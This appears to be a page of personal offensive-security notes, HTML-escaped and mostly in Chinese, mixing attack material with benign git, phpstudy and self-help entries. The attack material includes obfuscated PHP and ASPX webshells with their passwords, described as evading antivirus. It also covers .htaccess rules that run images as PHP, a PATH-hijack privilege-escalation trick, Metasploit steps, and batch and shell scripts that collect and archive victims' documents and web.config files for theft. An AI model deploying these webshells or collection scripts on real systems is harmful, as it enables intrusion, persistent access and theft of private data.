   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);?&amp;gt;  密码是 -7
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php if(!$_POST[&#39;nihao&#39;]){header(&#39;HTTP/1.1 404 Not Found&#39;); exit(); }else{ $s=&quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;; @$s(&quot;~[discuz]~e&quot;,$_POST[&#39;nihao&#39;],&quot;Access denied&quot;); } ?&amp;gt;&lt;/span&gt;

   
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The requested URL was not found on this server.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
   &amp;lt;?php
   ($b4dboy = $_POST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;nihao&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;) &amp;amp;&amp;amp; @preg_replace(&#39;/ad/e&#39;,&#39;@&#39;.str_rot13(&#39;riny&#39;).&#39;($b4dboy)&#39;, &#39;add&#39;); 
   header(&#39;HTTP/1.1 404 Not Found&#39;);
   ?&amp;gt;

   &amp;lt;?php
   include &#39;xxoo.jpg&#39;;
   ?&amp;gt;
   xxoo.jpg为一句话图片木马,此php后门中在win下菜刀连接只能看到木马所在盘符文件,其他盘符磁盘下文件默认在菜刀中不可加载,也看不到,但是可通过虚拟终端&quot;dir 盘符:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;
   看到,对文件也有操作权限,在linux下可看到所有文件,该版本不被查杀

   &amp;lt;?php
   $file = fopen(&quot;test.php&quot;,&quot;w&quot;);
   fwrite($file,$_REQUEST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);
   fclose($file);
   ?&amp;gt;
   该版本不被查杀,且比上面一个更安全&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   aspx:
   ASPX一句话的过安全狗效果不怎么样,不过我认为能支持aspx百分之8/90支持asp
   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%@PageLanguage=Jscript%&amp;gt;      
   &amp;lt;%var/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;+&quot;v&quot;+/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/
   &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;s&quot;+&quot;t&quot;+      
   &quot;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&quot;+      
   &quot;,&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;)&quot;;eval      
   (/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/,/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/);%&amp;gt;  密码 -7
    
    
   &lt;span class=&quot;nv&quot;&gt;&amp;lt;%@PageLanguage=&quot;Jscript&quot;%&amp;gt;&amp;lt;%eval(Request.Item[&quot;shezhang&quot;],&quot;unsafe&quot;);%&amp;gt;&lt;/span&gt;
    
    
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C#&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;runat=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;server&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;      
   WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;);      
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;                              密码是webadmin

   aspx隐藏一句话新:http://z-cg.com/?mod=pad&lt;span class=&quot;ni&quot;&gt;&amp;amp;act=view&amp;amp;id=10(&amp;lt;%WebServices.ShowRunnerVersion();&lt;/span&gt;%&amp;gt;,&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%WebServices.InitializeWebServices(&quot;fuck&quot;);%&amp;gt;)
&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;windows local privileges:http://www.52wa.net/post-198.html
                            http://le4f.net/post/post/windows-x64-local-privilege-escalation
                            https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9067#lastpost
                            https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
                            http://www.freebuf.com/articles/web/76892.html
                            https://github.com/foxglovesec/Potato
                            in meterpreter:
                            meterpreter&amp;gt;background
                            msf&amp;gt;use post/multi/recon/local_exploit_suggester 
                            msf&amp;gt;show options
                            msf&amp;gt;exploit
                            or  
                            meterpreter&amp;gt;run post/multi/recon/local_exploit_suggester
&lt;span class=&quot;p&quot;&gt;32.&lt;/span&gt;phpstudy for linux:
  wget -c http://lamp.phpstudy.net/phpstudy.bin?
  chmod +x phpstudy.bin
  # 权限设置
  ./phpstudy.bin     #运行安装

  服务进程管理:phpstudy (start|stop|restart|uninstall)
  站点主机管理:phpstudy (add|del|list)
  ftpd用户管理:phpstudy ftp (add|del|list)
&lt;span class=&quot;p&quot;&gt;33.&lt;/span&gt;strem:http://www.yxbao.com/bd/27803.html#goDown
&lt;span class=&quot;p&quot;&gt;34.&lt;/span&gt;linux的git使用:
  http://www.linuxidc.com/Linux/2014-02/96989.htm
  完成密钥的设置后:
  git init
  git add .
  git commit -a -m &quot;xxx&quot;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;没有这一步会显示error&amp;gt;
  git remote add origin url
  git push -u origin master

  更新部分文件时,提交更新:
  git add file(changed file or new file,the command &#39;git add&#39; means add file to local git repositories)
  git status(check is the file status is ok)
  git commit -a -m &quot;something&quot;(without commit command can not update the file,this is a &#39;must&#39;)
  git push -u origin master&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;  新建本地git仓库时,添加文件:(要先pull下来tar_url的文件到新建的文件夹,然后将要提交的文件复制到新建文件夹中,
  如果先把要提交的新文件放到新建的文件夹下再进行如下一串命令,将提示出错)
  git init(在随便新建的一个文件夹下)
  git pull tar_url(该条命令执行后用新文件替换旧文件)
  git status
  git add newfile (git add .)
  git commit -a -m &quot;xxx&quot;
  git remote add origin tar_url
  git push -u origin master                                               
&lt;span class=&quot;p&quot;&gt;
35.&lt;/span&gt;生活学习:1&amp;gt;(本杰明-富兰克林13条)http://www.201980.com/lizhi/chenggong/9386.html
             2&amp;gt;(曾国藩修身12条)http://www.201980.com/lizhi/chenggong/8007.html
&lt;span class=&quot;p&quot;&gt;36.&lt;/span&gt;mouse without borders:多屏幕同键盘鼠标控制
              https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460(win)
              http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
              x2vnc(目前认为最好,通过vnc达到mouse without borders的功能!!)
&lt;span class=&quot;p&quot;&gt;37.&lt;/span&gt;java执行jar文件命令:java -jar xx.jar
&lt;span class=&quot;p&quot;&gt;38.&lt;/span&gt;.htaccess can be :
  1&amp;gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;haha&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  SetHandler application/x-httpd-php
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
  2&amp;gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Files&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;demo&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;jpg&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  ForceType application/x-httpd-php
  SetHandler application/x-httpd-php
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Files&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;39.&lt;/span&gt;临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.
&lt;span class=&quot;p&quot;&gt;40.&lt;/span&gt;(command1 &amp;amp; command2)==(command1;command2)    
   command1 &amp;amp;&amp;amp; command2中,如果command1不成功,command2则不会执行,(command1 &amp;amp; command2)或(command1;command2)中如果command1不成功,command1会执行
   locate &lt;span class=&quot;ge&quot;&gt;*.doc &amp;gt; doc.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.docx &amp;gt; docx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.pdf &amp;gt; pdf.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.txt &amp;gt; txt.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.xls &amp;gt; xls.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.xlsx &amp;gt; xlsx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.jpg &amp;gt; jpg.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.png &amp;gt; png.list
   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
   
   or when there exist the same ip but different site:

   find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.\(doc\|docx\)&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;xls&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;xlsx&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;jpg&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;png&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; jpg.list    
   ///find . -regex &quot;xxx&quot;   (.)  .  can be used or not while they both mean find the current path
   ///sometimes the system may not support &amp;amp;&amp;amp; to execute &quot;find&quot;,then we should execute above find command without &quot;&amp;amp;&amp;amp;&quot; and find them one by one
   ///or maybe sometimes the system may not support -regex in find command
   ///or maybe sometimes the system may not support without path command with find,use . or ./ better any time find the current path 
   then the better answer:
   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
   ///however,i found that &quot;&amp;amp;&amp;amp;&quot; or &quot;||&quot; are both not the best,coz command &quot;a &amp;amp;&amp;amp; b&quot; means only command &quot;a&quot; execute successly,then &quot;b&quot; can execute
   ///comman &quot;a || b&quot; means if &quot;a&quot; execute successly,then &quot;b&quot; will not execute
   ///but comman &quot;a;b&quot; means &quot;a&quot; and &quot;b&quot; will both execute,no mater the former &quot;a&quot; execute successfully or not 
   so,the better and beeter combine command is:
   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list;find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list;find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list;find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list;find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz

   recently I found command1;command2 performs not good to search all files in webshell&#39;s upon commonds,better to execute comman1 &amp;amp;&amp;amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:

   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list
   tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz

   or:
   mkdir /tmp/tmp
   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
   tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz

   sometimes when try to execute in this way:
   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1

   may found it didn&#39;t succeed to create list file except for doc.list,then try useing normal webshell&#39;s terminal to execute the one without root privilege in one of upon ways&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   windows:
   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo &quot;yes&quot; | for /r f:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (&lt;span class=&quot;ge&quot;&gt;*.doc,*&lt;/span&gt;.docx,&lt;span class=&quot;ge&quot;&gt;*.pdf,*&lt;/span&gt;.xls,&lt;span class=&quot;ge&quot;&gt;*.xlsx,*&lt;/span&gt;.txt) do copy &quot;%i&quot; f:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_r
   c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ar.exe a -k -r -s -m1 c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.rar c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
   7z.exe a -t7z -p123456 c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
   del /f/q folder
   rar a /v20m /m0 newfilename web.rar
   windows find web.config==&amp;gt;for /r c:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ttp&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (web.conf?g) do (echo &lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt;&lt;span class=&quot;ge&quot;&gt;*filepath*&lt;/span&gt;&lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt; &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo %i &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; type &quot;%i&quot; &amp;gt;&amp;gt; tmp.txt &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo. &amp;gt;&amp;gt; tmp.txt)
   windows bat批处理for用法:http://blog.csdn.net/wh_19910525/article/details/7912440&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   windows找文件命令:
   for /f %j in (&#39;dir /b /s &quot;c:&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;SCOMCTL.O?X&quot;&#39;) do (echo %j)
    windows找文件中的字符串命令:
   findstr /R &quot;.&lt;span class=&quot;ge&quot;&gt;*sa.*&lt;/span&gt;&quot; c:&lt;span class=&quot;se&quot;&gt;\1\*&lt;/span&gt; &amp;gt; tmp.txt

   powershell:dir –r | select-string &quot;root&quot;

   windows打包(7z)命令:1.bat
   ---------------content of 1.bat--------------------------
    @echo off
    goto :main
    这是注释:(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
    dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
    :main
    set str=c d e f g h i j k l m n o p q r s t u v w x y z 
    rd /s/q c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    md c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo  当前硬盘的分区有: 
    for %%i in (%str%) do (
    if exist %%i: (echo %%i:
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.doc&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; tmp.txt
    )
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.docx&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.pdf&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.txt&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xls&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xlsx&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    )
    )
    
